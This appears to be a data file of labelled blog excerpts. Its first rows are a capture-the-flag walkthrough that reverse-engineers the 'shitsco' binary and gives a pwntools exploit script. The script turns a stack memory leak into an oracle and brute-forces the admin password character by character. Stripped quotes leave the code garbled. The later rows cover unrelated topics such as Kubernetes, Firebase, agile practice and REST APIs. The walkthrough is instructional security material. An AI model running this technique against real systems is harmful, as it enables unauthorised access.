[esp+4Ch+dest], 0.text:08049318 call read_from_user.text:0804931D jmp loc_8049267Since we did not enter a password as an argument to enable, we are now prompted for a password with printf. Since there is not a new line at the end of the prompt we need to use fflush] on stdout to force the prompt to print. We saw this same setup for the command prompt in main earlier in this walkthrough.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
529,"Next we are setting up another call to the subroutine we renamed read_from_user. If you did not use n to rename the function, you will see a call to sub_8048C30. We already walked through the disassembly for read_from_user including creating a C code equivalent, which you can refer back __url__ read_from_user(int fd, char * buffer, int length, char stop)The function prototype is shown above. So we are reading from stdin (file descriptor 0), into the enable functions stack memory, at most 20h (32) bytes, and stopping at the 0ah (newline) character. So after read_from_user returns we should have a password attempt in ebx (and the contents of esp+4ch+s2) on the stack. Then we take the unconditional jump at .text:08049267 loc_8049267:; CODE XREF: sub_8049230+EDj.text:08049267 mov [esp+4Ch+src], ebx; s2.text:0804926B mov [esp+4Ch+dest], offset password; s1.text:08049272 call _strcmp.text:08049277 mov [esp+4Ch+var_14], eax.text:0804927B mov eax, [esp+4Ch+var_14].text:0804927F test eax, eax.text:08049281 jz short loc_80492B8.text:08049283 mov [esp+4Ch+n], ebx.text:08049287 mov [esp+4Ch+src], offset a Nope_The Passwo; Nope. The password isnt %s.text:0804928F mov [esp+4Ch+dest], 1.text:08049296 call ___printf_chk We should be zeroing in on our bug. After the jump we take our password read from the user and compare it to the password value from the data section that we read from a file in read_password function just after the program started. If you did not rename the variable in the data section line will read mov [esp+4Ch+dest], offset dword_804C3A0; s1. We saw a very similar function (strncmp) when we were comparing the user input for the command to our commands in our data structure. The only difference for strcmp (no n) is that the length is not set. Like strncmp, strcmp returns an integer less than, equal to, or greater than zero if s1 is found, respectively, to be less than, to match, or be greater than s2. There is just no hard stop at n bytes for strcmp.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
530,"The result of strcmp is saved on the stack at . If strcmp returns 0 the password guess is correct and the jump zero at is taken. However, in our dynamic analysis we put in an incorrect password, so lets not take the jump. We use printf to print out the string Nope. The password isnt %s where %s is ebx or our password guess read from the user. This is where our memory leak occurs. Clearly there is not a null at the end of our password guess in ebx to tell printf to stop reading the string.text:08048C57 cmp al, dl.text:08048C59 jz short loc_8048C88Looking back at read_from_user, after a byte is read into eax, it is compared with the lowest byte of edx (dl) which is our stop character (0ah). If they match, a jump is taken.text:08048C88 loc_8048C88:; CODE XREF: sub_8048C30+18j.text:08048C88; sub_8048C30+29j.text:08048C88 add esp, 2Ch.text:08048C8B mov eax, ebx.text:08048C8D pop ebx.text:08048C8E pop esi.text:08048C8F pop edi.text:08048C90 pop ebp.text:08048C91 retn After the jump, the stack is unwound, and read_from_user returns. The function does not add a null byte at the end of the string. Recall that read_from_user was called in main to get the users command choice.text:0804888F mov eax, esi.text:08048891 mov edi, ebx.text:08048893 mov ecx, 14h.text:08048898 rep stosd In main, right before we set up the arguments for read_from_user, we use the rep stosd instruction to store the dword eax at edi, ecx times. Esi is xored with itself a few lines before at.text:08048836 and is now moved into eax. Ebx was set to an address in mains stack frame with lea ebx, [esp+1Ch] earlier in main and is now moved into edi. So this writes null into esp+1ch 14h (20).text:080492FD mov [esp+4Ch+var_40], 0Ah.text:08049305 mov [esp+4Ch+n], 20h.text:0804930D mov [esp+4Ch+src], ebx.text:08049311 mov [esp+4Ch+dest], 0.text:08049318 call read_from_user Here in the enable function we read into ebx.text:080492E0 lea ebx, [esp+4Ch+s2]Ebx points to the stack location esp+4ch+s2. But esp+4ch+s2 is not zeroed out before the call to read_from_user. Thus there is stale stack data still present after the users data that printf may pick up and print out as it blindly waits for a null to signify the end of the string.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
531,"Of course this is only half the battle. We now need some way to turn junk printed out to the terminal into a working exploit. It would be quite nice if the correct password was saved on the stack just after our user password guess. Use ctrl+k to view the stack frame for the enable function.-0000004C; D/A/*: change type (data/ascii/array)-0000004C; N: rename-0000004C; U: undefine-0000004C; Use data definition commands to create local variables and function arguments.-0000004C; Two special fields r and s represent return address and saved registers.-0000004C; Frame size: 4C; Saved regs: 0; Purge: 0-0000004C;-0000004C-0000004C dest dd? ; offset-00000044 n dd?-00000040 var_40 dd?-0000003C db? ; undefined-00000014 var_14 dd?-00000010 var_10 dd?-0000000C db? ; undefined+00000000 r db 4 dup(? )+00000004 arg_0 dd?+00000008Unfortunately, looking at the stack layout the password from the data section is stored at .text:0804926B mov [esp+4Ch+dest], offset password; s1What we do have right after s2 (the user data) is var_14 . Var_14 is the return value from strcmp.text:08049267 mov [esp+4Ch+src], ebx; s2.text:0804926B mov [esp+4Ch+dest], offset password; s1.text:08049272 call _strcmp.text:08049277 mov [esp+4Ch+var_14], eax Var_14 will be an Integer value that will change based on how the user provided string compares to the password from the data section. Looking back at the man page, strcmp returns an integer less than, equal to, or greater than zero if s1 is found, respectively, to be less than, to match, or be greater than s2.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",7
532,"Now we want to send our guess (a) with padding out to the end of our 32 byte stack space for s2. I chose space (0x20) for the padding because it is the lowest hex value for a printable character. Assuming all of the password characters are printable the space will always be less than or equal to the password character. After we send the password we expect to receive a line back from the binary, the Nope. The password isnt Having captured that line I want var_14 in its own variable. It took a little guess and check to get the offset into that string but we know we have 32 bytes for s2 and counting the characters in the Nope comes out at 26. Thus 32+26 = 58 so var_14 just after that should be at offset 59 in the string. Now we want to print the values integer representation out as part of a string at .georgia@geode:~/shitsco$ python sploit.py[+] Starting local process ./shitsco: Doneoooooooo8 oooo o88 o8888 888ooooo oooo o888oo oooooooo8 ooooooo ooooooo888oooooo 888 888 888 888 888ooooooo 888 888 888 888888 888 888 888 888 888 888 888 888o88oooo888 o888o o888o o888o 888o 88oooooo88 88ooo888 88ooo88Welcome to Shitsco Internet Operating System (IOS)For a command list, enter?$Please enter a password: Nope. The password isnt a Var_14 is:1[*] Stopped program ./shitsco Run the script with the Python interpreter. As expected Var_14 is a positive integer .","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
533,"Thus we should be able to loop through the printable characters and compare them to the first character of the password. Until we reach the correct character we will get back a 1. Then when we get the character correct the comparison will move to comparing the next character to space. 20h is less than any other printable character, so we will know we have found a correct character when we get 255 (-1) back from the script. This basically gives you an oracle to test each character of the password individually. Then we can record the correct character and start looping on the next character until we get the full password and authenticate with S __url__ pwn import *p = process(./shitsco)stuff = p.recvuntil($)print stuffdone = 0correctpassword = mychar = found = 0This new script starts out the same as the previous by running Shitsco and receiving data until the $ prompt for a command. We add in some new variables: done=0 will set to 1 when we successfully authenticate. This will be an indicator that the script should stop adding more characters to the password. correctpassword= is an empty string to which we will add characters as we find them to be correct in our loop. mychar is another empty string we will use for holding potential correct __url__ done!= 1:print Password Found So Far: + correctpasswordfor x in string.printable:p.send(enable)stuff = p.recvuntil(:)stuff2 = correctpassword + x + * (31len(correctpassword))p.send(stuff2)stuff = p.recvline()number = stuff[59]Then we enter a while loop until done is set to 1. Each time we exit the inner loop we should have added on a new character to correctpassword. So we print it out to the user at each pass. Our inner for loops through the printable characters. We send the enable command, receive until the password prompt, and send in our password guess . The guess is made up of any previously discovered correct characters, our current guess from string.printable, and spaces for padding out to the end of s2s 32 bytes on the stack. Just like in our last script we receive the response and grab offset 59 which is var_ __url__ ord(number) == 1:mychar = xcontinueif ord(number) == 255:p.send(enable + correctpassword + x + )mystuff = p.recvline()if Successful in mystuff:done = 1correctpassword = correctpassword + xbreakelse:p.send(enable + correctpassword + mychar + )mystuff = p.recvline()if Successful in mystuff:done = 1correctpassword = correctpassword + mycharbreakelse:correctpassword = correctpassword + mycharbreakprint The password is: + correctpasswordp.interactive()If var_14 is 1 either we are still too low of a value for our guess, or we have the correct character and the 1 is our space being less than the next character of the password. We hold our current guess in mychar for now and continue to the next iteration of the for loop.","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
534,"We send enable followed by correctpassword followed by x (our current character guess). If the line we receive back includes Successful we know this is the correct password. We didnt get to that part of the enable function with our reverse engineering, but we can find the string for successful authentication at 0x080492B8 as shown below.text:080492B8 mov [esp+4Ch+dest], offset a Authentication; Authentication Successful.text:080492BF mov ds:dword_804C3C0, 1.text:080492C9 mov ds:byte_804C380, 23h.text:080492D0 call _puts If correctpassword + x authenticated we fill in the last character of the password and set done equal to 1 to stop our outer loop as well. If not then we try correctpassword + mychar (the value from the previous loop). Same deal, if we get Successful in our returned string, we update correctpassword to include mychar, set done equal to 1, and break out of the for loop. Otherwise we have just found the next character of the password and need to continue guessing the remaining character. Just add mychar to the end of correctpassword and break out of the for loop. Since we are not at the end of the password we did not set done to 1.georgia@geode:~/shitsco$ python sploit2.py[+] Starting local process ./shitsco: Doneoooooooo8 oooo o88 o8888 888ooooo oooo o888oo oooooooo8 ooooooo ooooooo888oooooo 888 888 888 888 888ooooooo 888 888 888 888888 888 888 888 888 888 888 888 888o88oooo888 o888o o888o o888o 888o 88oooooo88 88ooo888 88ooo88Welcome to Shitsco Internet Operating System (IOS)For a command list, enter?$Password Found So Far: Password Found So Far: f Password Found So Far: fo Password Found So Far: foo Password Found So Far: foob Password Found So Far: fooba The password is: foobar[*] Switching to interactive mode# $Once we guess the complete password we have administrative access on the binary. I used the p.interactive() command in my Python code from pwntools to interact with the process. Now that I have admin access (and the # for the prompt) if we run the? command, we see the command flag is available. If this were the real CTF challenge, a flag would be in place and we could use this command to score our points in the game.# $?==========Available Commands==========|enable ||ping ||tracert ||? ||flag ||shell ||set ||show ||credits ||quit ||disable |======================================Type? followed by a command for more detailed information# $If we look back at the commands structure and find the offset for flag.data:0804C2B4 dd offset a Prints The Flag T; Prints the flag to the console.data:0804C2B8 dd 1.data:0804C2BC dd 0.data:0804C2C0 dd offset sub_8048D40Moving on to sub_8048D40 it is easy to spot the flag file being opened for reading.text:08048D64 mov [esp+4Ch+modes], offset modes; r.text:08048D6C mov [esp+4Ch+filename], offset a Home Shitsco Fla; /home/shitsco/flag.text:08048D73 call _fopen If we create a file at /home/shitsco/flag (like we did for the password file at the beginning of this exercise) we can emulate using our admin access to get the flag.$Password Found So Far: Password Found So Far: f Password Found So Far: fo Password Found So Far: foo Password Found So Far: foob Password Found So Far: fooba The password is: foobar[*] Switching to interactive mode# $ flag The flag is: testflag The root cause of this issue was that the user input for the password is not null terminated which allowed us to leak stack data. The return value from strcmp function between the correct password and user provided password is on the stack after the user supplied password. We used this leaked info as an oracle to brute force the correct password character by character. Strings without a null terminator leading to memory leaks are a common security issue. In this case we used the leak specifically to the binary, but in many cases memory leaks can be used in tandem with other bugs to bypass address space layout randomization (ASLR).","['Capture The Flag', 'Reverse Engineering', 'Penetration Testing', 'Infosec', 'Cybersecurity']",3
535,"Its tempting to think of Cloud Storage like a filesystem. In many ways its similar, except for one important fact: there are actually no directories or folders! The top level of organization is called a bucket, which is a container for objects. Each bucket is effectively a big namespace full of objects, each with unique names within that space. Object names can look and feel like they have a directory structure to them (for example, /users/lisa/photo.jpg), but there are no directories or folders behind the scenes. These path-like names are helpful for organization and browsing in both the Cloud and Firebase consoles. Sometimes, we just use the word folder to make it easy to describe these paths.","['Firebase', 'Google Cloud Platform', 'Software Engineering', 'Cloud', 'Software Development']",7
536,"When you create a Firebase project, or add Firebase to an existing GCP project, a new storage bucket is automatically created for that project. This helps reduce the amount of configuration required to get started with Cloud Storage in a mobile app. Since all Cloud Storage bucket names across the entire system must be unique, this new bucket is named [YOUR-PROJECT-ID].appspot.com, where YOUR-PROJECT-ID is the globally unique ID of your project. You normally dont even need to know this bucket name, as its baked into your Firebase app configuration file. When Firebase gets initialized, itll automatically know which bucket to use by default. In fact, this bucket is usually referred to as the default storage bucket for Firebase.","['Firebase', 'Google Cloud Platform', 'Software Engineering', 'Cloud', 'Software Development']",7
537,"Theres one interesting difference between Firebase and Cloud. As youve just read, they both provide access control to objects in storage buckets, but those rules are mutually exclusive from each other. You use Cloud IAM to control access to an object only from backend systems and SDKs, but you use Firebase security rules to control access only from mobile applications using the Firebase client SDKs. These access control mechanisms dont overlap or interfere with each other in any way. Note that the Firebase Admin SDK is actually a server-side SDK, which can also be used to access Cloud Storage. In fact, the API it provides is actually just a wrapper around the Cloud SDKs, which are controlled by IAM.","['Firebase', 'Google Cloud Platform', 'Software Engineering', 'Cloud', 'Software Development']",11
538,"A team member is interested in measuring and making product quality transparent using Sonar Qube? Fabulous, go ahead, the team can only gain from it. Another team members first concern is to implement fail-safe logging to avoid losing messages and to ensure messages can be traced? Go for it, its also good for everybody. The third team member is passionate about measuring how and how often users use certain functions of the application? Cool, that is also very much needed. It is important for the fourth co-worker to make the API of the system transparent? (S)he should definitely come up with and implement a good solution. Another team member is interested in a feature? The team can also gain from the continued development of the feature.","['Agile', 'Recognition', 'Leadership', 'Shared Responsibility']",0
539,"So, when were showing people methods and techniques and tools to help them address contemporary needs in a flexible, dynamic, effective way, doesnt it make sense to help them approach problems in a similarly flexible, dynamic, and effective way? We dont need to re-build the past over and over again. Weve been there and done that. We need to build the future. The game teaches a method that can be used to do that. Instead of dictating the elements the Lego City must contain, why not let the workshop participants imagine, brainstorm, and iterate through ideas for living and working spaces that people can adapt as their needs evolve? After all, isnt that what wed like them to do on the job, when theyre iteratively developing software to meet peoples ever-changing needs? As far as teaching Scrum is concerned, the players would be constantly revisiting and refining their Backlog, constantly questioning their ideas, constantly refreshing their thinking, constantly collaborating, constantly refactoring their designs. It would be a far more dynamic experience than just burning down a Backlog of 19th century city features, and much closer to an agile software development process.","['Scrum', 'Agile', 'Agile Transformation', 'Project Management', 'Software Development']",12
540,"When I was first learning about move semantics in C++, I kept reading articles that explained in terms of other scary sounding jargonlvalues, rvalue references, memcpy, ownership. None of these things are strictly necessary to know about to understand the core of move semantics. (Though, the more you learn about them, the greater your understanding of move semantics will become. )You may have heard of move semantics, and may know that theyre faster, but not why, or even how to move something. (Here moves and move semantics mean the same thing. )This article will deliberately simplify or ignore some concepts (like constructors, rvalue references, stack vs heap) to make the core idea of moving easier to follow, so dont worry if you already know this stuff and see something that isnt technically correct. Ill mark clarifications for these with a number. This article is aimed at those writing everyday (non-library) code, with little to no existing understanding of move semantics, to help get over the initial conceptual hurdle.","['Programming', 'Cpp', 'Cplusplus', 'Software Development', 'Crabs']",9
541,"You can find the code used to perform the copy and move here:1: As seen above, movable actually refers to rvalue references. This guide has more information on them.2: The stack is known as automatic storage. The new keyword does not always allocate with dynamic storage, though that is the usual implementation. More.3: The term object in C++ has a specific definition, that at a high level just means a variable. We dont mean object in the object oriented sense.4: I say a moved object will be in an incorrect state afterwards. Specifically, it will be in a valid but unspecified stateit will still be part of correct, well defined behavior C++ code, but the value might just now be semantically useless.5: Ownership (in my own experience at least) is a concept that seems nebulous and imprecise until you suddenly get it. I like this article on the subject. It clicked for me while I was learning Rust, which has very strict and explicitly defined lifetime and ownership semantics.","['Programming', 'Cpp', 'Cplusplus', 'Software Development', 'Crabs']",3
542,"I have implemented a model introducing three types of developers; 1) agile team members that are fully dedicated, 2) an agile pool of specialists that are shared in a program (pref. between 23 teams) and 3) specialists that are needed rarely or only limited time and that are shared across the organisation. Introducing type 2 relieve opportunities for attaching many types of disciplines and specialists in HW, though keeping them close(r) to the agile teams. But be awareit is not an excuse for resource/line managers to keep their people in their own stable! Aligning with other organizations, labs, external suppliers etc. In practice, a supplier of new equipment needed for a HW company may work waterfall and are not able to release anything before date of delivery. If something needs to be changed after delivery, it will postpone development. I have seen internal labs using the same rigid modelqueue up and wait for results, causing waiting times and additional queues.","['Agile', 'Scaled Agile Framework', 'Scrum', 'Lean', 'Innovation Management']",1
543,"A few things to keep in mind when deploying your cluster with kops. Before you know it, you can tear it down again because you didnt think things through! This happened to me several times. It is important to think first before you set up your cluster. It is easier to do this at the start than with a live cluster. Some things to consider:kops uses default t2.medium EC2 instances These are already costly if you plan on launching a small cluster (which is exactly what happened to me, I didnt specify the instances I wanted to use, so my bill went up very fast).already think about which topology you want It is rather difficult to change your topology (without downtime) once you have a working cluster. You can choose between a private topology or public topology. In a public topology, each master node and regular node will be open to the outside, in a private topology these nodes will be behind AWS Load Balancers. Beware that a private topology requires AWS NAT configuration, which is also billed per internal request, these costs can get quite high if you didnt anticipated this (again, I learned this the hard way).use bastions or dont use bastions If you have a private topology, meaning that the individual nodes are not directly accessible, you would want to think about setting up bastion nodes. These nodes will have their own Auto Scaling Group in AWS and will make sure you can SSH into them and access your nodes from inside your private topology directly from __url__ amount of master nodes You can choose how many master nodes you want. It is possible to run on 1 master node (which I am doing right now), but there is a trade off you will have to make. The more ideal scenario would be to have 3 master nodes (uneven number to avoid split brain issues). Running on 1 master node has the following consequences; rolling upgrades will take your master down, as well as your whole cluster at that moment and if AWS experiences issues in an availability zone you will have no other master nodes to rely on. If it isnt your priority to have an SLA of 99%, youre good with 1 __url__ of EC2 instance master node Another important thing is the machine type of your master node. If your master node doesnt have enough resources, it will begin to act strange. Random outages will occur and youll scratch your head on the reason why this happens. Always make sure you put your master node(s) on instances with enough memory and cpu, too much is better than too little resources.","['Docker', 'Kubernetes', 'AWS', 'Kops']",11
544,"If you are familiar with AWS, you probably know that you can utilise spot instances. AWS has a lot of infrastructure it does not use from time to time, this depends on the demand of instances. These instances are sold to bidders which are mostly just a fraction of the price of an on-demand instance, only downside is that Amazon can reclaim them without prior notice. I thought it was a good idea to do this, because if you think of it, Kubernetes is build to withstand loss of underlying nodes. With kops this is very easy to do, just add the following line of max Price to your kops config. This denotes the maximum price you are willing to pay for a spot instance, which in this case is the same as the price of an on-demand instance. This will ensure that you dont pay more for a spot instance than for an on-demand instance.","['Docker', 'Kubernetes', 'AWS', 'Kops']",11
545,"An important thing to keep in mind is the usage of EBS volumes on AWS. There are several types of EBS volumes, the most widely used are gp2 and io1. EBS volumes of type gp2 are far less expensive, but hold a burst balance, which means that it can only hold high rates of IO for a small amount of time. If the burst balance is 0, your EBS basically stops with doing any IO until it can recharge. Very important to keep this in mind if you have applications which need very high IO for longer periods of time, for example if you are running Elastic Search and need to rebuild indices. The other type of EBS volumes is io1, these volumes dont have a burst balance and will perform consistently, but are a lot costlier. Choice wisely and think about your burst balance if your application suddenly slows down on IO.","['Docker', 'Kubernetes', 'AWS', 'Kops']",11
546,"It is very important that you always set your requests and limits as accurately as possible, for Kubernetes and for yourself. They are a little tricky at first to understand, but are quite self-explanatory. You can set requests and limits on Deployments, Stateful Sets, Daemon Sets, Pods, etc. Requests denote what your application wants to use and is preferably going to use. So if you have a Deployment of an application which is happy with 500Mi of memory and 1 CPU, meaning that it will preferably consume 500Mi of the hosts memory and 1 of the hosts CPUs. Whereas a request is a soft limit, a limit is a hard limit, if your application passes your limits it will be killed. Something to keep in mind, if you dont see any errors but your pod is restarting, chances are high it is getting killed for passing its limits. The resources can be set in your yaml configuration file of your Deployment, Pod, etc.","['Docker', 'Kubernetes', 'AWS', 'Kops']",11
547,"Downsides of not setting your requests just right:lets say your application uses 1000M of memory instead of the 500Mi you said and Kubernetes has scheduled it on an underlying EC2 instance which only had 600Mi free memory, what is going to happen? Your EC2 instance will become unresponsive because all of its memory will be used till the point it cannot work properly anymore. Kubernetes should know this and fix this, right? It is not so easy as youd think, how will Kubernetes know how much resources your application will consume? The only one who can guess this and get this right, is __url__ say your application only uses 250Mi of memory, this is good right? You will not run into other issues, because the underlying EC2 instances will have enough spare room, but you will underutilise your EC2 instance. You will waste a lot of precious money by not setting this right. After some investigation I found out I could save $50 on my $180 monthly bill just by setting my requests just right and not wasting any resources.","['Docker', 'Kubernetes', 'AWS', 'Kops']",11
548,"Kubernetes has 2 kinds of probes, readiness probes and liveness probes. Readiness probes are used to monitor if traffic should be sent to the pod or not, if it fails its readiness probe, Kubernetes will not route traffic to that pod anymore. Liveness probes are a little more aggressive, if a pod does not respond to a liveness probe, the pod will be terminated and another one will take its place. It can really help you setting these on your pods, I was having a problem where Kubernetes scaled down all my pods and put up new ones after a deployment update, this is good because this is how it should be, but it resulted in my applications being down for a brief moment because it takes a moment before those new pods can process new requests. If you set a readiness probe you avoid that your pods receive traffic before they are actually ready. You can specify the initial delay and which kind of probe to use, an HTTP probe or TCP probe.","['Docker', 'Kubernetes', 'AWS', 'Kops']",11
549,"Eclipse Equinox is an implementation of the OSGi core specification that allows Eclipse applications to dynamically install, activate, de-activate, update and/or uninstall components and services (plugins) that extend/enhance the applications capabilities. A plugin is a modular, self-contained unit that provides an API that can be used within an Eclipse application or by other plugins. A plugin can provide enhancements to the Eclipse application UI (e.g. additional menus, buttons, dialogs, etc), can provide Java classes that allow the user to perform tasks (e.g. commit to VCS repositories, run Unit tests, deploy web applications to a server, etc.) Additionally, plugins can provide extension points so users can extend the plugin by adding missing/additional functionality. For example, the Mylyn plugin defines extension points that allow users to connect to task services not covered out of the box.","['Eclipse', 'Guice']",18
550,"As the description indicates, this class allows other plugins to contribute implementations of the API that provide access to repositories in different persistence technologies. Imagine we would like to provide an implementation that can work with text files and another that can work with a database. In order to access each of them, a different set of information is needed; e.g. for the file a path/location is enough, for the database we might need url, login credentials, and target database. Hence, each implementation requires a separate configuration dialog to provide the necessary information. We can solve this by adding another attribute to our extension point through which the specific configuration dialog to use is provided too, as presented in the next figure.","['Eclipse', 'Guice']",15
551,"Quoting the official documentation: This means that we are going to create different roles that will be assumed by some of our actors (ci-web for example, or a specific role for each application that we want to deploy). It looks like this: If this role is going to be assumed, we need to grant permissions for that as well. In this case, we want an EC2 instance to be able to assume it, as our CI will be running there. We can do that with a aws_iam_policy_document.","['AWS', 'Iam', 'Terraform', 'Security']",7
552,"Statements are quite flexible and have a bunch of configuration options. I am going to focus on three of their arguments, effect, actions and resources.effect can be either Allow or Deny. We actually always set them to Allow. As mentioned, we want to give the least possible amount of privileges, so our policies should only be granting what a role absolutely needs. That means there should never be necessary to revoke a particular permission in a different part of the code.actions are what we want to be able to do in AWS. They basically map to single API calls, and they are really granular. What you should really avoid is giving blanket permissions such as: This not only goes against the principle of least privilege, but it also will create a maintainability mess, as you will have a very hard time afterwards reducing permissions without something breaking. Trust me on this one, invest the time upfront and make sure you only give permissions that are needed. There is an excellent reference guide that I find extremely useful when giving permissions incrementally.","['AWS', 'Iam', 'Terraform', 'Security']",11
553,"This means were modeling 6 distinct elements: Concert Piece Orchestra Composer Conductor Soloist But we can immediately find some areas for improvement. Its clear that some Conductors might also be Composers (like Esa-Pekka Salonen) or Soloists (like Itzhak Perlman). We prefer to not have two separate vertices representing the same distinct individual, so well roll these up under a single Artist label. Well use the relationship of that person to a Concert to describe their role in the proceedings. We can keep Orchestra separate because it is an organization made up of different individual artists. Well also prefer the more generic term Work over Piece, to encompass a broader variety of music.","['Janusgraph', 'Tinkerpop', 'Graph', 'Data Model', 'Music Analytics']",5
554,"From that point on, who knows what those pieces became. Cars, trucks, planes, buildings, a LEGO remote control car designed to carry a wireless camera. Just random creations of my own design. Not great design by any means, but they were mine. At one point, I built a functioning elevator for my pet hamster. (Thats a story for another time though.) Building, and more importantly, designing things, was my thing.","['Programming', 'Software Development', 'Software', 'Software Engineering', 'Software Architecture']",5
555,"I met a guy who had some ideas for different businesses. He was (and still is) a fast-paced, high-energy person. One of his ideas was to create a web-based, video training platform for business leaders. I liked the concept and we started a partnership. I was able to build the website and membership platform and he was responsible for basically everything else. Networking, product guidance, sales, all of the business stuff I knew nothing about yet.","['Programming', 'Software Development', 'Software', 'Software Engineering', 'Software Architecture']",2
556,"I started reviewing website platforms and finally settled on Joomla. Its built in PHP and has a very healthy third-party developer ecosystem. Wordpress was available at the time too, but it just wasnt as big as it is now. So, once I settled on Joomla, the real fun began. I decided the best way to get started was to start from the bottom and work my way up so I setup my first server.","['Programming', 'Software Development', 'Software', 'Software Engineering', 'Software Architecture']",19
557,"I started learning Wordpress and began doing basic websites for clients. I was basically a general contractor for websites. I would do what I could myself and farm the rest out. I was also blessed to be introduced to (and eventually contracted by) a non-profit here in the Nashville area. The non-profit job helped pay the bills while I worked on moving from a Web Developer to a Programmer. All from the comfort of my own home office. :)Along the way I met a sales guy who was able to sell those Wordpress sites. We formed a partnership and started a classic web dev company. At first, we just did websites. That quickly changed to offering design, SEO, social media marketing, and general business consulting services. This new business isnt really the point of this post, but I bring it up because along with the non-profit job, it provided me with opportunities to meet people much smarter than me in this space, and gave me the projects to implement all of the new things I was learning.","['Programming', 'Software Development', 'Software', 'Software Engineering', 'Software Architecture']",2
558,"I had been staring at it for years in Joomla and Wordpress. Only making surface level changes and at best, copying lines from the internet and pasting them into my files. Through the non-profit, I met a guy that, for some reason, found it in his heart to teach me PHP. Even more, he taught me how to think about problems and how to break them down into their components.","['Programming', 'Software Development', 'Software', 'Software Engineering', 'Software Architecture']",2
559,"So programming in Javascript using the Functional Programming (FP) paradigm became my next goal. I had already learned a few other paradigms with PHP. Classes, Factory, Object Oriented, Procedural it was clear that learning to program this way, through paradigms, was most helpful for me. The concepts are broad and usually dont apply to a single language. Learning the syntax is more narrow. When you learn concepts you learn how to program.","['Programming', 'Software Development', 'Software', 'Software Engineering', 'Software Architecture']",9
560,Domain specific interviews focus on what youve actually built. In order to pass these interviews it is important that youve built projects in the relevant technologies. Be proud of your work and dont be shy to dig into the technical details of specific projects. No one wants to hear about some code you wrote last year and havent touched since. It will feel stale to you and that will come off in the interview.,"['Interview', 'Software Engineering', 'Software Development', 'Hiring', 'Startup']",0
561,"Another common tactic for domain specific interviews is building something awesome or debugging actual issues. This is normally a take home test that you will have 24 to 48 hours to complete. For example, if youre a Laravel developer and the company uses Laravel they may ask you to build a miniature version of the companys product or products they regularly build. With a take home test, be prepared to put in a ton of work. Have starter templates ready and dont be afraid to google for answers, email for help and use outside packages. The most important criterion for passing a domain specific interview is to showcase that you can build something that works! Computer Science and fundamentals programming interviews are categorically different from domain specific interviews. These tests are to evaluate your problem solving ability and focus more on finding optimal solutions rather than simply getting things done. Oftentimes the interviewer will not ask anything about who you are, your work history or projects youve built. In computer science fundamentals interviews the job of the interviewer is to asses your raw programming ability, normally through questions about data structures and algorithms.","['Interview', 'Software Engineering', 'Software Development', 'Hiring', 'Startup']",0
562,"Its important to remember you are interviewing the company just like they are interviewing you. Often times the work during interviews will be similar to the job youll be asked to perform. Are the challenges they give you the type of work you like to do? Do they respect your time and abilities? If the answer is no to any of those questions consider looking elsewhere. Know your strengths and weaknesses and remember to have fun during the search process. Interviewing is a great way to meet people, learn about new technologies and search within yourself.","['Interview', 'Software Engineering', 'Software Development', 'Hiring', 'Startup']",0
563,"One of the common mistakes developers make regarding REST APIs is to treat them as databases. Visit any web framework documentation and at some point youll bump into a magic way of mapping database CRUD operations of ORM models with REST API endpoints. Each letter of CRUD becoming HTTP verbs: C = POSTR = GETU = PUT or PATCHD = DELETEI am the first to admit that these operations naturally match each other, which justifies combining them. However, the problem begins when developers start associating REST APIs with database concepts and miss the whole point of REST. The purpose of databases is to store data, and APIs are all about how components interact with each other. Another problem is that if you build an API around database concepts theres a high chance that over time it will become ambiguous and hard to maintain because thats what naturally happens to database schemas, they get more and more generic and ambiguous over time because they need to serve different contexts and by consequence get stretched by them.","['API', 'Software Engineering', 'Development', 'Programming']",8
564,"You can take it literally, it means when you do REST you transfer the state of something over some protocol (HTTP is the common choice). The something that gets its state transfered is also known as a resource. And the state is like a snapshot of the resource. Can the resource be directly mapped to an ORM model? But this resource might be many things, not only an ORM model. For example, its very common for some resources to be a read-only compilation of data.","['API', 'Software Engineering', 'Development', 'Programming']",8
565,"So how should REST APIs be built then? Build APIs around user contexts Imagine an API that is consumed in very different ways by each user. For example, a shipping company that has an API with a Shipment resource in it. Do you think Shipment will be seen the same way by a Buyer, a Seller or the Carrier? These users have views of the Shipment resource and need to do different operations on the API. The Buyer wants to pay and track the shipment. The Seller on the other hand is only worried about inventory and shipping fast. The carrier cares about the dimensions and weight of the package and its destination, so it goes. If you build this API as an one-in-all solution for these three users youll end up with an ambiguous and over-stretched API that will be difficult to evolve, hard to maintain and will expose more data than it should. In this case you should build three specialised APIs, one for each user context. Because of the hight coupling on data level these three APIs should live in the same project, most modern web frameworks support subdomain or prefix routing, implementing it shouldnt be a problem. It might sound like too much work but over time it will pay off. An alternative to contexts would be implementing permissions or some sort of access control on the API, Im a bit wary of this approach as it adds unnecessary complexity in my opinion.","['API', 'Software Engineering', 'Development', 'Programming']",10
566,"One challenge we faced in this process was that the vertex normal data structures were being used by some of the brushes to encode data that had nothing to do with vertex normals but related to animated particle behaviour. The Draco encoding tool, quite reasonably, thinks you probably want your normals to be normalised so it does this for you as part of the encoding process. This corrupted all this non-standard particle position data. We found we were able to maintain the integrity of this data by copying the normal information over to the tangents data structure, which wasnt normalised. However the THREE.js g LTF decoder ignores tangent information as they are now calculated in real time by its Standard shader. We had to write a custom version of the THREE.js g LTF decoder that read the tangent information and then copied it back into the normal array consistent with the the brush shaders expectations.","['Ramadan', 'Google', 'VR', 'Webgl', 'Threejs']",14
567,"A framework may define many other lifecycle methods. Some frameworks have the notion of a pause or sleep mode. Some frameworks have methods to tell the component that is about to be updated, or has completed an update. And often, a single lifecycle phase change may have multiple methods, one which is called before the change and one which is called after. Again, using R __url__ as an example, theres component Will Update() and component Did Update(). The first is typically used to prepare for the update, while the second is often used to inform other components that the update happened.","['Software Engineering', 'Programming']",18
